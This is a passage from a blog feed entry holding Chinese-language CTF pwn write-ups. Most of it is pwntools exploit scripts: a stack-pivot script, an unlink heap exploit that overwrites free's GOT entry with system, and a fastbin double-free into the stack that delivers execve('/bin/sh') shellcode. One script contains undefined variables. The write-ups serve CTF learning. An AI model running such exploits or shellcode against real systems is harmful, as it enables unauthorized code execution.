class="string">'a'</span></div><div class="line">p.send(buf)</div><div class="line"></div><div class="line"></div><div class="line">buf = <span class="string">'a'</span>*<span class="number">504</span></div><div class="line">buf += p32(<span class="number">0x0804A080</span>+<span class="number">4</span>)</div><div class="line">p.sendline(buf)</div><div class="line">data = p.recvuntil(<span class="string">"\n"</span>)</div><div class="line">p.sendline(<span class="string">"cat /lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>pwn2的libc可以从pwn1中获取。非常经典的double free教学题。可以参考 <a href="http://www.tuicool.com/articles/yquU732" target="_blank" rel="external">http://www.tuicool.com/articles/yquU732</a> （double free浅析，乌云的文章）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-07 19:09:17</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(<span class="string">'./pwn2'</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x0400A6D\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(<span class="string">"120.27.248.138"</span>,<span class="number">12345</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,length,data)</span>:</span></div><div class="line">ru(<span class="string">"the action:"</span>)</div><div class="line">sd(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"note index:\n"</span>)</div><div class="line">sd(str(index))</div><div class="line">ru(<span class="string">" of the new note:\n"</span>)</div><div class="line">sd(str(length))</div><div class="line">ru(<span class="string">"ts of note:"</span>)</div><div class="line">sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"the action:"</span>)</div><div class="line">sd(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"ter the note index:"</span>)</div><div class="line">sd(str(index))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,length,data)</span>:</span></div><div class="line">ru(<span class="string">"the action:"</span>)</div><div class="line">sd(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">" note index:"</span>)</div><div class="line">sd(str(index))</div><div class="line">ru(<span class="string">" new note:"</span>)</div><div class="line">sd(str(length))</div><div class="line">ru(<span class="string">"of note:\n"</span>)</div><div class="line">sd(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"the action:"</span>)</div><div class="line">sd(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">" note index:"</span>)</div><div class="line">sd(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_anyaddr</span><span class="params">(addr,data)</span>:</span></div><div class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(<span class="number">0x6020a8</span>)+p64(<span class="number">0</span>)+p64(addr)</div><div class="line">edit(<span class="number">0</span>,len(payload),payload)</div><div class="line">edit(<span class="number">2</span>,len(data),data)</div><div class="line"></div><div class="line">add(<span class="number">0</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">1</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">2</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">3</span>,<span class="number">512</span>,<span class="string">"/bin/sh\x00"</span>)</div><div class="line">head = p64(<span class="number">0</span>)+p64(<span class="number">1</span>+<span class="number">512</span>)</div><div class="line">fd = p64(<span class="number">0x6020C0</span> - <span class="number">0x18</span>)</div><div class="line">bk = p64(<span class="number">0x6020C0</span> - <span class="number">0x10</span>)</div><div class="line">payload =  head+fd+bk</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">512</span>-len(payload))</div><div class="line">payload += p64(<span class="number">512</span>)+p64(<span class="number">512</span>+<span class="number">0x10</span>)</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">600</span>-len(payload))</div><div class="line">edit(<span class="number">0</span>,<span class="number">600</span>,payload)</div><div class="line">dele(<span class="number">1</span>)</div><div class="line"></div><div class="line">free_got = <span class="number">0x602018</span></div><div class="line">edit_anyaddr(<span class="number">0x6020C0</span>+<span class="number">0x20</span>,p64(puts_got))</div><div class="line">show(<span class="number">4</span>)</div><div class="line">free_addr = u64(ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"free_addr="</span>+hex(free_addr)</div><div class="line"></div><div class="line">offset = <span class="number">0x83940</span><span class="number">-0x45390</span></div><div class="line">system_addr = puts_addr - offset</div><div class="line">edit_anyaddr(<span class="number">0x602018</span>,p64(system_addr))</div><div class="line">dele(<span class="number">3</span>)</div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment">#flag&#123;038a6d27a716d1e1472b1eded07c385d&#125;</span></div></pre></td></tr></table></figure><p>pwn3是fastbin double free attack的考察点，要利用这个攻击我们需要伪造出一个fake fastbin出来,所幸题目给予了所有的攻击条件。</p><p>可参考 <a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-07 19:09:17</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x4009da\nc")</span></div><div class="line"><span class="comment"># else:</span></div><div class="line"><span class="comment"># p = remote()</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">welcome</span><span class="params">(data)</span>:</span></div><div class="line">ru(<span class="string">"name\n"</span>)</div><div class="line">sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,length,data)</span>:</span></div><div class="line">ru(<span class="string">"delete paper\n"</span>)</div><div class="line">sd(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"o store(0-9):"</span>)</div><div class="line">sd(str(index))</div><div class="line">ru(<span class="string">"ill enter:"</span>)</div><div class="line">sd(str(length))</div><div class="line">ru(<span class="string">"our content:"</span>)</div><div class="line">sd(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(index,length,data)</span>:</span></div><div class="line">sd(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"o store(0-9):"</span>)</div><div class="line">sd(str(index))</div><div class="line">ru(<span class="string">"ill enter:"</span>)</div><div class="line">sd(str(length))</div><div class="line">ru(<span class="string">"our content:"</span>)</div><div class="line">sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"delete paper\n"</span>)</div><div class="line">sd(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"index(0-9):"</span>)</div><div class="line">sd(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setsize</span><span class="params">(size)</span>:</span></div><div class="line">ru(<span class="string">"delete paper\n"</span>)</div><div class="line">sd(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"number:"</span>)</div><div class="line">sd(str(size))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"delete paper\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*(<span class="number">0x30</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*(<span class="number">0x30</span>))</div><div class="line"><span class="keyword">return</span> u64(ru(<span class="string">"\n"</span>)[<span class="number">0x30</span>:<span class="number">0x30</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line">buf =  <span class="string">""</span></div><div class="line">buf += <span class="string">"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"</span></div><div class="line">buf += <span class="string">"\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"</span></div><div class="line">buf += <span class="string">"\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"</span></div><div class="line">buf += <span class="string">"\x00\x56\x57\x48\x89\xe6\x0f\x05"</span></div><div class="line"></div><div class="line">shellcode = buf</div><div class="line">shellcode_addr = <span class="number">0x6020c0</span></div><div class="line"></div><div class="line">welcome(shellcode)</div><div class="line">setsize(<span class="number">0x30</span>)</div><div class="line">stack_addr = leak_stack()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"stack_addr="</span>+hex(stack_addr)</div><div class="line">offset = <span class="number">0x7ffcfca53d30</span> - <span class="number">0x00007ffcfca53c20</span> </div><div class="line">target_addr = stack_addr-offset<span class="number">-0x8</span></div><div class="line"><span class="keyword">print</span> <span class="string">"offset = "</span>+hex(offset)</div><div class="line"><span class="keyword">print</span> <span class="string">"target_addr = "</span>+hex(target_addr)</div><div class="line"></div><div class="line">add2(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">dele(<span class="number">0</span>)</div><div class="line">dele(<span class="number">1</span>)</div><div class="line">dele(<span class="number">0</span>)<span class="comment">#a-b-a</span></div><div class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,p64(target_addr))</div><div class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,p64(target_addr))</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x10</span>+p64(shellcode_addr)</div><div class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,payload)</div><div class="line">sd(<span class="string">"4"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pwn1，没什么好说的，看了下checksec，NX没开，栈迁移以后直接执行bss上的shellcode就可以了。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div cl
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="heap overflow" scheme="https://winter3un.github.io/tags/heap-overflow/"/>
    
  </entry>
  
</feed>
